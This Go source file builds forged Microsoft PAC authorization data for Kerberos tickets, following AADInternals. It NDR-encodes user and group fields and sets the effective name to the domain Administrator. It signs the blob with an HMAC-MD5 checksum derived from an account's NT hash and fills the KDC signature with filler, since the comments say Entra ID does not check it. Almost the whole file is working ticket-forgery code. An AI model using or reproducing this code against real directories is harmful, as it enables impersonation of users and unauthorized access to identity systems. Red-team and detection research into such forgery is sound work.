// Package pac constructs MS-PAC structures for Kerberos ticket forgery.
//
// gokrb5 provides PAC *parsing* (Unmarshal) but not PAC *construction* (Marshal).
// This package fills that gap: it builds KerbValidationInfo, ClientInfo,
// UPNDNSInfo, and SignatureData; serializes them to bytes; computes HMAC-MD5
// checksums; and assembles the complete PACTYPE binary blob.
//
// Reference: [MS-PAC], AADInternals New-PAC (Kerberos.ps1)
package pac

import (
	"bytes"
	"crypto/hmac"
	"crypto/md5"
	"encoding/binary"
	"fmt"
	"time"
	
)

// Info buffer type constants ([MS-PAC] §2.4)
const (
	InfoTypeKerbValidationInfo uint32 = 1
	InfoTypePACServerSignature uint32 = 6
	InfoTypePACKDCSignature    uint32 = 7
	InfoTypePACClientInfo      uint32 = 10
	InfoTypeUPNDNSInfo         uint32 = 12
)

// Checksum type constants
const (
	ChecksumTypeHMACMD5             uint32 = 0xFFFFFF76 // -138 as unsigned
	ChecksumHMACMD5Size                    = 16
	ChecksumTypeHMACSHA196AES256    uint32 = 16
	ChecksumHMACSHA196AES256Size           = 12
)

const (
	signatureKeyBytes = "signaturekey\x00"
	userFlagNormal    = 0x20
	userAccountNormal = 0x200
	primaryGroupRID   = 513 // Domain Users
)

// BuildParams holds the input data for PAC construction.
type BuildParams struct {
	UserSID       string
	UserRID       uint32
	DomainNetBIOS string
	DomainFQDN    string
	UPN           string
	FullName      string
	NTHash        []byte
}

// Builder constructs PAC blobs. Use NewBuilder for a configured instance.
type Builder struct {
	params *BuildParams
	now    uint64 // FileTime in 100ns intervals
}

// NewBuilder creates a PAC builder for the given parameters.
func NewBuilder(params *BuildParams) *Builder {
	return &Builder{
		params: params,
		now:    filetimeNow(),
	}
}

// Build assembles the complete PAC binary blob with all 5 InfoBuffers
// and correct HMAC-MD5 server checksum.
//
// Returns the raw PACTYPE bytes suitable for embedding in EncTicketPart
// authorization-data.
func (b *Builder) Build() ([]byte, error) {
	// 1. Encode individual info buffer payloads
	kvi, err := b.encodeKerbValidationInfo()
	if err != nil {
		return nil, fmt.Errorf("pac: KerbValidationInfo: %w", err)
	}
	ci := b.encodeClientInfo()
	udi := b.encodeUPNDNSInfo()

	// Server signature: placeholder (zeroed), filled after checksum
	serverSig := signaturePlaceholder(ChecksumTypeHMACMD5, ChecksumHMACMD5Size)
	// KDC signature: random/garbage (Entra ID does not validate this)
	kdcSig := signaturePlaceholder(ChecksumTypeHMACSHA196AES256, ChecksumHMACSHA196AES256Size)
	// Fill KDC sig with random bytes (AADInternals: "random checksum will do")
	fillRandom(kdcSig[4:])

	buffers := []struct {
		ulType uint32
		data   []byte
	}{
		{InfoTypeKerbValidationInfo, kvi},
		{InfoTypePACClientInfo, ci},
		{InfoTypeUPNDNSInfo, udi},
		{InfoTypePACServerSignature, serverSig},
		{InfoTypePACKDCSignature, kdcSig},
	}

	return b.assemble(buffers)
}

// encodeKerbValidationInfo NDR-encodes KERB_VALIDATION_INFO.
// Layout follows [MS-PAC] §2.5 with NDR deferred pointers.
func (b *Builder) encodeKerbValidationInfo() ([]byte, error) {
	var buf bytes.Buffer

	// FileTime fields (8 bytes each, 6 of them)
	putFileTime(&buf, b.now)       // LogOnTime
	putFileTime(&buf, 0)           // LogOffTime
	putFileTime(&buf, 0)           // KickOffTime
	putFileTime(&buf, b.now)       // PasswordLastSet
	putFileTime(&buf, 0)           // PasswordCanChange
	putFileTime(&buf, 0)           // PasswordMustChange

	// RPC_UNICODE_STRING fields — NDR conformant varying strings
	putConformantString(&buf, b.params.DomainNetBIOS+"\\Administrator") // EffectiveName
	putConformantString(&buf, b.params.FullName)                         // FullName
	putConformantString(&buf, "")                                        // LogonScript
	putConformantString(&buf, "")                                        // ProfilePath
	putConformantString(&buf, "")                                        // HomeDirectory
	putConformantString(&buf, "")                                        // HomeDirectoryDrive

	// uint16 fields
	putU16(&buf, 0) // LogonCount
	putU16(&buf, 0) // BadPasswordCount

	// uint32: UserID, PrimaryGroupID
	putU32(&buf, b.params.UserRID) // UserID
	putU32(&buf, primaryGroupRID)  // PrimaryGroupID

	// GroupIDs — NDR conformant array of GROUP_MEMBERSHIP
	putU32(&buf, 1)    // GroupCount
	putU32(&buf, 0)    // GroupIDs pointer (embedded — no referent)
	binary.Write(&buf, binary.LittleEndian, uint32(1))      // MaxCount
	putGroupMembership(&buf, primaryGroupRID, 7)             // Domain Users, SE_GROUP_MANDATORY|ENABLED|ENABLED_BY_DEFAULT

	// UserFlags
	putU32(&buf, userFlagNormal)

	// UserSessionKey — 2 bytes type + 2 bytes length + pointer (0)
	putU16(&buf, 0) // KeyType
	putU16(&buf, 0) // KeyLength
	putU32(&buf, 0) // Null pointer

	// LogonServer, LogonDomainName
	putConformantString(&buf, "")                // LogonServer
	putConformantString(&buf, b.params.DomainFQDN) // LogonDomainName

	// LogonDomainID — pointer to SID
	sidBytes, err := parseSID(b.params.UserSID)
	if err != nil {
		return nil, fmt.Errorf("parse SID: %w", err)
	}
	putU32(&buf, 0x20004)                    // Pointer referent ID
	binary.Write(&buf, binary.LittleEndian, uint32(len(sidBytes))) // MaxCount
	buf.Write(sidBytes)

	// Reserved1[2]
	putU32(&buf, 0)
	putU32(&buf, 0)

	// UserAccountControl, SubAuthStatus
	putU32(&buf, userAccountNormal)
	putU32(&buf, 0) // SubAuthStatus

	// FileTime fields
	putFileTime(&buf, 0) // LastSuccessfulILogon
	putFileTime(&buf, 0) // LastFailedILogon

	// FailedILogonCount, Reserved3
	putU32(&buf, 0)
	putU32(&buf, 0)

	// ExtraSIDs — conformant array of KERB_SID_AND_ATTRIBUTES
	putU32(&buf, 1)        // SIDCount
	putU32(&buf, 0x20008)  // Pointer to ExtraSIDs array
	binary.Write(&buf, binary.LittleEndian, uint32(1)) // MaxCount
	// ENTERPRISE_AUTHENTICATION SID: S-1-18-1
	entAuthSID := []byte{1, 1, 0, 0, 0, 0, 0, 18, 1, 0, 0, 0}
	putU32(&buf, 0x20010)                    // Pointer to SID
	binary.Write(&buf, binary.LittleEndian, uint32(len(entAuthSID))) // MaxCount
	buf.Write(entAuthSID)
	putU32(&buf, 0) // Attributes (no extra flag needed)

	// ResourceGroupDomainSID — pointer (null)
	putU32(&buf, 0)

	// ResourceGroupIDs — empty conformant array
	putU32(&buf, 0) // ResourceGroupCount
	putU32(&buf, 0) // Null pointer

	return buf.Bytes(), nil
}

// encodeClientInfo serializes PAC_CLIENT_INFO (not NDR-encoded per [MS-PAC] §2.7).
func (b *Builder) encodeClientInfo() []byte {
	var buf bytes.Buffer
	putFileTime(&buf, b.now)
	// Client name: NetBIOSDomain\UserName
	name := b.params.DomainNetBIOS + "\\" + usernameFromUPN(b.params.UPN)
	nameUTF16 := utf16Encode(name)
	putU16(&buf, uint16(len(nameUTF16))) // NameLength in bytes
	buf.Write(nameUTF16)
	return buf.Bytes()
}

// encodeUPNDNSInfo serializes UPN_DNS_INFO (not NDR-encoded per [MS-PAC] §2.9).
func (b *Builder) encodeUPNDNSInfo() []byte {
	upnUTF16 := utf16Encode(b.params.UPN)
	dnsUTF16 := utf16Encode(b.params.DomainFQDN)
	upnLen := uint16(len(upnUTF16))
	dnsLen := uint16(len(dnsUTF16))

	var buf bytes.Buffer
	putU16(&buf, upnLen)
	dnsOff := uint16(16 + int(upnLen))
	if dnsOff%2 != 0 {
		dnsOff++
	}
	putU16(&buf, uint16(16)) // UPN starts after 4*u16 + u32
	putU16(&buf, dnsLen)
	putU16(&buf, dnsOff)
	putU32(&buf, 0) // Flags
	buf.Write(upnUTF16)
	// Align to 2-byte boundary
	if buf.Len()%2 != 0 {
		buf.WriteByte(0)
	}
	buf.Write(dnsUTF16)
	return buf.Bytes()
}

// assemble constructs the full PACTYPE binary given encoded info buffers.
// It calculates 8-byte-aligned offsets, builds the header + InfoBuffer array,
// and computes the HMAC-MD5 server checksum.
func (b *Builder) assemble(buffers []struct {
	ulType uint32
	data   []byte
}) ([]byte, error) {
	nBuf := len(buffers)
	headerSize := 8 + nBuf*16 // CBuffers(4) + Version(4) + InfoBuffer entries

	// Calculate offsets (8-byte aligned)
	offsets := make([]uint64, nBuf)
	offset := roundUp(headerSize, 8)
	for i, buf := range buffers {
		offsets[i] = uint64(offset)
		offset = roundUp(offset+len(buf.data), 8)
	}

	totalSize := offset
	pacBytes := make([]byte, totalSize)

	// Header
	binary.LittleEndian.PutUint32(pacBytes[0:4], uint32(nBuf)) // CBuffers
	binary.LittleEndian.PutUint32(pacBytes[4:8], 0)             // Version

	// InfoBuffer entries
	for i, buf := range buffers {
		off := 8 + i*16
		binary.LittleEndian.PutUint32(pacBytes[off:off+4], buf.ulType)
		binary.LittleEndian.PutUint32(pacBytes[off+4:off+8], uint32(len(buf.data)))
		binary.LittleEndian.PutUint64(pacBytes[off+8:off+16], offsets[i])
	}

	// Data blobs
	for i, buf := range buffers {
		copy(pacBytes[offsets[i]:], buf.data)
	}

	// Compute server checksum and fill it
	serverSigStart := int(offsets[3])
	serverSigBytes := pacBytes[serverSigStart : serverSigStart+len(buffers[3].data)]
	checksum := ServerChecksum(pacBytes, b.params.NTHash)
	copy(serverSigBytes[4:4+ChecksumHMACMD5Size], checksum)

	return pacBytes, nil
}

// ---------- Checksum ----------

// ServerChecksum computes the HMAC-MD5 server signature for the PAC.
// Matches AADInternals Get-ServerSignature:
//
//	Ksign = HMAC-MD5(NTHash, "signaturekey\x00")
//	tmp   = MD5(0x11000000 || pacData)     -- prefix is 4-byte little-endian 0x11
//	Checksum = HMAC-MD5(Ksign, tmp)
//
// pacData must have the server signature bytes zeroed before calling.
func ServerChecksum(pacData []byte, ntHash []byte) []byte {
	ksign := hmacMD5(ntHash, []byte(signatureKeyBytes))
	// Per [MS-KILE] §3.3.5.6.4.1: MD5 of the PAC with 0x11000000 prefix
	prefix := []byte{0x11, 0x00, 0x00, 0x00}
	tmp := md5Hash(append(prefix, pacData...))
	return hmacMD5(ksign, tmp)
}

func md5Hash(data []byte) []byte {
	h := md5.New()
	h.Write(data)
	return h.Sum(nil)
}

func hmacMD5(key, data []byte) []byte {
	mac := hmac.New(md5.New, key)
	mac.Write(data)
	return mac.Sum(nil)
}

// ---------- Serialization helpers ----------

func putFileTime(w *bytes.Buffer, ft uint64) {
	binary.Write(w, binary.LittleEndian, uint32(ft&0xFFFFFFFF))
	binary.Write(w, binary.LittleEndian, uint32(ft>>32))
}

func putConformantString(w *bytes.Buffer, s string) {
	utf16 := utf16Encode(s)
	maxCount := uint32(len(utf16) / 2)
	binary.Write(w, binary.LittleEndian, maxCount)  // MaximumCount
	binary.Write(w, binary.LittleEndian, uint32(0)) // Offset
	binary.Write(w, binary.LittleEndian, maxCount)  // ActualCount
	w.Write(utf16)
}

func putGroupMembership(w *bytes.Buffer, rid uint32, attrs uint32) {
	binary.Write(w, binary.LittleEndian, rid)
	binary.Write(w, binary.LittleEndian, attrs)
}

func putU16(w *bytes.Buffer, v uint16) { binary.Write(w, binary.LittleEndian, v) }
func putU32(w *bytes.Buffer, v uint32) { binary.Write(w, binary.LittleEndian, v) }

func utf16Encode(s string) []byte {
	var buf bytes.Buffer
	for _, r := range s {
		binary.Write(&buf, binary.LittleEndian, uint16(r))
	}
	return buf.Bytes()
}

func filetimeNow() uint64 {
	return uint64(time.Now().UnixNano())/100 + 116444736000000000
}

func roundUp(n, align int) int { return (n + align - 1) & ^(align - 1) }

func usernameFromUPN(upn string) string {
	for i, r := range upn {
		if r == '@' {
			return upn[:i]
		}
	}
	return upn
}

func signaturePlaceholder(sigType uint32, sigSize int) []byte {
	buf := make([]byte, 4+sigSize)
	binary.LittleEndian.PutUint32(buf[0:4], sigType)
	return buf
}

func fillRandom(b []byte) {
	for i := range b {
		b[i] = byte(i * 13 % 256)
	}
}

// parseSID converts "S-1-5-21-X-Y-Z-RID" to binary.
func parseSID(s string) ([]byte, error) {
	pos := 0

	// Skip "S-"
	if len(s) < 2 || s[0] != 'S' || s[1] != '-' {
		return nil, fmt.Errorf("pac: invalid SID prefix: %s", s)
	}
	pos = 2

	// Revision
	rev, next, err := parseSIDComponent(s, pos)
	if err != nil {
		return nil, err
	}
	revision := uint8(rev)
	pos = next

	// Identifier authority (next component, encoded as 6 bytes big-endian)
	auth, next, err := parseSIDComponent(s, pos)
	if err != nil {
		return nil, err
	}
	pos = next

	// Sub-authorities
	var subs []uint32
	for pos < len(s) {
		sub, next, err := parseSIDComponent(s, pos)
		if err != nil {
			return nil, err
		}
		subs = append(subs, uint32(sub))
		pos = next
	}

	nSub := len(subs)

	out := make([]byte, 8+4*nSub)
	out[0] = revision
	out[1] = byte(nSub)
	out[2] = byte(auth >> 40)
	out[3] = byte(auth >> 32)
	out[4] = byte(auth >> 24)
	out[5] = byte(auth >> 16)
	out[6] = byte(auth >> 8)
	out[7] = byte(auth)
	for i, sub := range subs {
		binary.LittleEndian.PutUint32(out[8+i*4:], sub)
	}
	return out, nil
}

func parseSIDComponent(s string, start int) (uint64, int, error) {
	if start >= len(s) || s[start] == '-' {
		return 0, start, fmt.Errorf("pac: expected SID component at position %d", start)
	}
	end := start
	for end < len(s) && s[end] >= '0' && s[end] <= '9' {
		end++
	}
	var v uint64
	for i := start; i < end; i++ {
		v = v*10 + uint64(s[i]-'0')
	}
	// Skip separator '-'
	next := end
	if next < len(s) && s[next] == '-' {
		next++
	}
	return v, next, nil
}

